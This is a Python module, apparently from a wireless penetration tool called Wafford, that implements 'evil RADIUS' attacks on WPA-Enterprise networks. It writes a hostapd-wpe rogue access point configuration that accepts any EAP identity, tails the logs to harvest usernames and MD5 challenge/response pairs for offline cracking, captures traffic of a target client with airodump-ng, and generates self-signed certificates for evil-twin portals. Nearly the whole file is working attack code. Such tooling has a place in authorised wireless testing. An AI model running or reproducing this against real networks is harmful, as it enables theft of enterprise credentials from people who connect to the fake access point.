"""Enterprise 802.1X/RADIUS attack modules for Wafford."""

from __future__ import annotations

import asyncio
import logging
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from collections.abc import Callable

from wafford.scripts.shell import ShellRunner

logger = logging.getLogger("wafford.core.enterprise")


@dataclass
class CapturedIdentity:
    """An EAP identity captured from a client."""
    identity: str
    mac: str = ""
    eap_type: str = ""
    timestamp: float = 0.0
    challenge: str = ""
    response: str = ""


@dataclass
class EnterpriseResult:
    """Result of an enterprise attack."""
    operation: str = ""
    identities: list[CapturedIdentity] = field(default_factory=list)
    cert_path: str = ""
    success: bool = False
    error: str = ""
    started_at: float = 0.0
    ended_at: float = 0.0


class EnterpriseAttack:
    """802.1X/RADIUS enterprise attack orchestrator.

    Implements evil RADIUS server attacks for WPA-Enterprise networks,
    including EAP identity harvesting, challenge capture, and certificate spoofing.
    """

    HOSTAPD_WPE_CONF = "/tmp/wafford_hostapd_wpe.conf"  # noqa: S108
    HOSTAPD_WPE_LOG = "/tmp/wafford_hostapd_wpe.log"  # noqa: S108
    CERT_DIR = "/tmp/wafford_certs"  # noqa: S108

    def __init__(self, interface: str) -> None:
        self.interface = interface
        self.shell = ShellRunner()
        self._running = False
        self._process: asyncio.subprocess.Process | None = None
        self._identities: list[CapturedIdentity] = []
        self._log_task: asyncio.Task[None] | None = None
        self._identity_callbacks: list[Callable[[CapturedIdentity], None]] = []

    def on_identity_captured(self, callback: Callable[[CapturedIdentity], None]) -> None:
        """Register callback for captured identities."""
        self._identity_callbacks.append(callback)

    def _emit_identity(self, identity: CapturedIdentity) -> None:
        """Notify callbacks of a captured identity."""
        for cb in self._identity_callbacks:
            try:
                cb(identity)
            except Exception as e:
                logger.error("Identity callback error: %s", e)

    async def start_evil_radius(
        self,
        ssid: str = "Enterprise-WiFi",
        channel: int = 6,
        interface: str | None = None,
    ) -> EnterpriseResult:
        """Start an evil RADIUS server using hostapd-wpe.

        Creates a rogue WPA-Enterprise access point that captures
        EAP authentication exchanges from connecting clients.

        Args:
            ssid: SSID for the rogue AP.
            channel: Operating channel.
            interface: Override interface (uses self.interface if None).
        """
        iface = interface or self.interface
        self._running = True
        self._identities.clear()
        start_time = time.time()

        result = EnterpriseResult(
            operation="evil_radius",
            started_at=start_time,
        )

        logger.info(
            "Starting evil RADIUS: iface=%s ssid=%s channel=%d",
            iface, ssid, channel,
        )

        try:
            self._generate_hostapd_wpe_config(ssid, channel, iface)

            proc = await asyncio.create_subprocess_exec(
                "hostapd-wpe", self.HOSTAPD_WPE_CONF,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            self._process = proc

            self._log_task = asyncio.create_task(
                self._monitor_hostapd_wpe_log()
            )

            await asyncio.sleep(3)

            if proc.returncode is not None:
                stderr_data = proc.stderr
                if stderr_data:
                    err = await stderr_data.read()
                    result.error = f"hostapd-wpe failed to start: {err.decode()}"
                else:
                    result.error = "hostapd-wpe failed to start"
                self._running = False
                return result

            logger.info("Evil RADIUS started successfully on %s", iface)
            result.success = True

        except FileNotFoundError:
            result.error = "hostapd-wpe not found — install hostapd-wpe package"
            logger.error("hostapd-wpe binary not found")
            self._running = False
        except Exception as e:
            logger.error("Evil RADIUS failed: %s", e)
            result.error = str(e)
            self._running = False

        result.ended_at = time.time()
        return result

    async def capture_eap_identities(self) -> list[CapturedIdentity]:
        """Return all captured EAP identities.

        Continuously monitors the hostapd-wpe log for new EAP identity
        responses from connecting clients.
        """
        return list(self._identities)

    async def eap_md5_challenge(
        self,
        target_mac: str,
        interface: str | None = None,
    ) -> EnterpriseResult:
        """Capture EAP-MD5 challenge-response from a client.

        This attempts to capture the challenge and response frames
        for offline MD5 hash cracking.

        Args:
            target_mac: Target client MAC address.
            interface: Override interface.
        """
        iface = interface or self.interface
        start_time = time.time()

        result = EnterpriseResult(
            operation="eap_md5_challenge",
            started_at=start_time,
        )

        logger.info(
            "Capturing EAP-MD5 challenge: iface=%s target=%s",
            iface, target_mac,
        )

        try:
            output_dir = "/tmp/wafford_captures"  # noqa: S108
            Path(output_dir).mkdir(parents=True, exist_ok=True)
            timestamp = int(time.time())
            cap_file = f"{output_dir}/eap_md5_{target_mac.replace(':', '')}_{timestamp}.pcap"

            cmd = (
                f"airodump-ng {iface} "
                f"--bssid {target_mac} "
                f"--write {cap_file.replace('.pcap', '')} "
                f"--output-format pcap"
            )

            proc = await asyncio.create_subprocess_shell(  # noqa: S602 -- composed airodump command
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            self._process = proc

            await asyncio.sleep(30)

            if proc.returncode is None:
                proc.terminate()
                try:
                    await asyncio.wait_for(proc.wait(), timeout=5.0)
                except TimeoutError:
                    proc.kill()

            result.success = True
            logger.info("EAP-MD5 capture completed: %s", cap_file)

        except Exception as e:
            logger.error("EAP-MD5 capture failed: %s", e)
            result.error = str(e)

        result.ended_at = time.time()
        return result

    async def generate_self_signed_cert(
        self,
        cn: str = "wifi.example.com",
        org: str = "WiFi Corp",
        days: int = 3650,
    ) -> str:
        """Generate a self-signed SSL certificate for evil twin TLS.

        Creates cert + key in CERT_DIR for use with evil twin HTTPS portals.

        Args:
            cn: Common Name for the certificate.
            org: Organization name.
            days: Validity period in days.
        """
        Path(self.CERT_DIR).mkdir(parents=True, exist_ok=True)
        cert_dir = Path(self.CERT_DIR)
        cert_path = cert_dir / "server.pem"
        key_path = cert_dir / "server.key"

        logger.info("Generating self-signed cert: cn=%s org=%s", cn, org)

        try:
            cmd = (
                f"openssl req -x509 -newkey rsa:2048 "
                f"-keyout {key_path} "
                f"-out {cert_path} "
                f"-days {days} -nodes "
                f'-subj "/CN={cn}/O={org}"'
            )

            result = self.shell.run(cmd, timeout=30, capture_output=True)

            if result.returncode == 0:
                logger.info("Certificate generated: %s", cert_path)
                return str(cert_path)
            logger.error("Certificate generation failed: %s", result.stderr)
            return ""

        except Exception as e:
            logger.error("Certificate generation failed: %s", e)
            return ""

    async def get_captured_identities(self) -> list[CapturedIdentity]:
        """Get all captured EAP identities."""
        return list(self._identities)

    async def _monitor_hostapd_wpe_log(self) -> None:
        """Monitor hostapd-wpe log file for captured identities."""
        log_file = self.HOSTAPD_WPE_LOG

        try:
            await asyncio.sleep(2)

            while self._running:
                try:
                    proc = await asyncio.create_subprocess_exec(
                        "tail", "-f", "-n", "0", log_file,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )

                    stdout = proc.stdout
                    if stdout is None:
                        break

                    while self._running:
                        line = await asyncio.wait_for(
                            stdout.readline(),
                            timeout=2.0,
                        )
                        if not line:
                            break

                        text = line.decode("utf-8", errors="replace").strip()
                        self._parse_wpe_log_line(text)

                    proc.terminate()
                    await proc.wait()

                except TimeoutError:
                    continue
                except asyncio.CancelledError:
                    break
                except Exception as e:
                    logger.debug("Log monitor error: %s", e)
                    await asyncio.sleep(2)

        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.error("Log monitor failed: %s", e)

    def _parse_wpe_log_line(self, line: str) -> None:
        """Parse a hostapd-wpe log line for identity information.

        Args:
            line: A single line from hostapd-wpe log output.
        """
        line_lower = line.lower()

        if "identity" in line_lower or "eap" in line_lower:
            identity_match = None
            mac_match = None

            import re

            identity_patterns = [
                r"identity[:\s]+['\"]?([^'\"\s,]+)",
                r"Station\s+([0-9a-fA-F:]{17}).*identity[:\s]+['\"]?([^'\"\s,]+)",
                r"EAP-Identity:\s*(\S+)",
            ]

            for pattern in identity_patterns:
                match = re.search(pattern, line, re.IGNORECASE)
                if match:
                    if match.lastindex and match.lastindex >= 2:
                        mac_match = match.group(1)
                        identity_match = match.group(2)
                    elif match.lastindex and match.lastindex >= 1:
                        identity_match = match.group(1)
                    break

            mac_patterns = [
                r"Station\s+([0-9a-fA-F:]{17})",
                r"MAC[:\s]+([0-9a-fA-F:]{17})",
                r"([0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2})",
            ]

            if not mac_match:
                for pattern in mac_patterns:
                    match = re.search(pattern, line, re.IGNORECASE)
                    if match:
                        mac_match = match.group(1)
                        break

            if identity_match:
                identity = CapturedIdentity(
                    identity=identity_match,
                    mac=mac_match or "",
                    timestamp=time.time(),
                )
                self._identities.append(identity)
                self._emit_identity(identity)
                logger.info(
                    "Captured EAP identity: %s from %s",
                    identity.identity, identity.mac,
                )

            challenge_patterns = [
                r"challenge[:\s]+([0-9a-fA-F]+)",
                r"response[:\s]+([0-9a-fA-F]+)",
            ]
            for pattern in challenge_patterns:
                match = re.search(pattern, line, re.IGNORECASE)
                if match and self._identities:
                    last = self._identities[-1]
                    if "challenge" in pattern:
                        last.challenge = match.group(1)
                    else:
                        last.response = match.group(1)

    def _generate_hostapd_wpe_config(
        self,
        ssid: str,
        channel: int,
        interface: str,
    ) -> None:
        cert_dir = Path(self.CERT_DIR)
        ca_cert = cert_dir / "ca.pem"
        server_cert = cert_dir / "server.pem"
        private_key = cert_dir / "server.key"

        # Write config with proper cert paths if available
        cert_lines = []
        if server_cert.exists() and private_key.exists():
            cert_lines = [
                f"ca_cert={ca_cert if ca_cert.exists() else server_cert}",
                f"server_cert={server_cert}",
                f"private_key={private_key}",
            ]
        else:
            cert_lines = [
                f"ca_cert={server_cert}",
                f"server_cert={server_cert}",
                f"private_key={private_key}",
            ]

        config = f"""# Wafford - hostapd-wpe configuration
interface={interface}
driver=nl80211
ssid={ssid}
channel={channel}
hw_mode=g

# WPA Enterprise settings
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP TKIP
rsn_pairwise=CCMP TKIP

# WPE settings — capture EAP exchanges
hw_ip_index=1
hw_ip_addr=192.168.1.1
hw_ip_netmask=255.255.255.0

# EAP methods to accept
eap_server=1
eapol_key_index_workaround=0

# Accept any EAP identity
own_ip_addr=192.168.1.1
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=testing123

# Log file
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2

# Enable client isolation
ap_isolate=1

# Allow all clients
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0

# Additional WPE-specific settings
eap_user_file=/tmp/wafford_eap_user
{chr(10).join(cert_lines)}
"""
        Path(self.HOSTAPD_WPE_CONF).parent.mkdir(parents=True, exist_ok=True)

        with Path(self.HOSTAPD_WPE_CONF).open("w") as f:
            f.write(config)

        eap_user_content = """# Wafford EAP user file
# Accept any identity/password combination
*     TTLS,PEAP,MD5,GTC,TLV,FAST   -
"t"     TTLS,MD5,GTC,TLV,FAST    "password"    [2]
"u"     TTLS,PEAP,GTC,TLV,FAST    "password"    [2]
"""
        eap_user_path = "/tmp/wafford_eap_user"  # noqa: S108
        with Path(eap_user_path).open("w") as f:
            f.write(eap_user_content)

        logger.info("hostapd-wpe config written to %s", self.HOSTAPD_WPE_CONF)

    async def stop(self) -> None:
        """Stop the evil RADIUS server and cleanup."""
        logger.info("Stopping evil RADIUS server")
        self._running = False

        if self._log_task and not self._log_task.done():
            self._log_task.cancel()
            try:
                await self._log_task
            except asyncio.CancelledError:
                pass

        if self._process and self._process.returncode is None:
            self._process.terminate()
            try:
                await asyncio.wait_for(self._process.wait(), timeout=5.0)
            except TimeoutError:
                self._process.kill()

        self.shell.run("pkill -f hostapd-wpe", timeout=5, capture_output=True)
        self.shell.run(
            f"ip link set {self.interface} down", timeout=5, capture_output=True
        )

        for path in [self.HOSTAPD_WPE_CONF, self.HOSTAPD_WPE_LOG]:
            Path(path).unlink(missing_ok=True)

        logger.info("Evil RADIUS stopped and cleaned up")

    async def start(
        self,
        ssid: str = "Enterprise-WiFi",
        channel: int = 6,
    ) -> EnterpriseResult:
        """Convenience method to start evil RADIUS.

        Args:
            ssid: SSID for the rogue AP.
            channel: Operating channel.
        """
        return await self.start_evil_radius(ssid=ssid, channel=channel)

    @property
    def is_running(self) -> bool:
        """Check if the evil RADIUS server is running."""
        return self._running

    @property
    def captured_count(self) -> int:
        """Get count of captured identities."""
        return len(self._identities)
